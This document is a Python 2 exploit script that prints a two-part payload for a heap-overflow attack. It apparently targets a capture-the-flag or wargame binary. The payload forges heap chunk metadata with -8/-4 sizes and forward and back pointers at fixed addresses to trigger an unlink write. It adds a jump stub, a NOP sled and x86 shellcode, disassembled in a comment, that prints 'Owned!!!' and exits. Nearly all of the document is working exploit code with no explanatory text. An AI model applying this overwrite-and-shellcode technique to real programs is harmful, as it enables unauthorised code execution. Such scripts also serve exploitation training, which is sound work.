import struct
import socket

# Total Buff 128
# ==========================================
# |  Buff(128)   | -8(4) | -4 |  FD  |  BR |
# ==========================================


# First Buff
payload = 'FSRDBBBB'


# push 0x804e0ae
# ret
payload+= '\xB8\x98\xE0\x04\x08\xFF\xE0'

# '\xB8\xB2\xE0\x04\x08\xFF\xE0'
# '\xB8\xAE\xE0\x04\x08\xFF\xE0'
# '\x68\xAE\xE0\x04\x08\xC3' # Limited size (8 bytes)Shellcode


payload+= 'B'*(128-len(payload)-1)
payload+= '/'
payload1 = payload


# Second Payload
payload = 'FSRD'
payload+= 'ROOT'
payload+= '\x90'*4
payload+= '/'
payload+= struct.pack("i", -8)
payload+= struct.pack("i", -4)
payload+= struct.pack("i",0x0804d41c-12) # FD
payload+= struct.pack('I', 0x804e010)  # Bk


"""
0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  31 c9                   xor    ecx,ecx
6:  31 d2                   xor    edx,edx
8:  b0 04                   mov    al,0x4
a:  b3 01                   mov    bl,0x1
c:  68 64 21 21 21          push   0x21212164
11: 68 4f 77 6e 65          push   0x656e774f
16: 89 e1                   mov    ecx,esp
18: b2 08                   mov    dl,0x8
1a: cd 80                   int    0x80
1c: b0 01                   mov    al,0x1
1e: 31 db                   xor    ebx,ebx
20: cd 80                   int    0x80

"""

shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
payload+= '\xeb\x0f'
payload+= '\x90'*20 # 90-bytes Shellcode here
payload+= shellcode

payload+= '\xcc'*(128-len(payload))
print payload1+payload
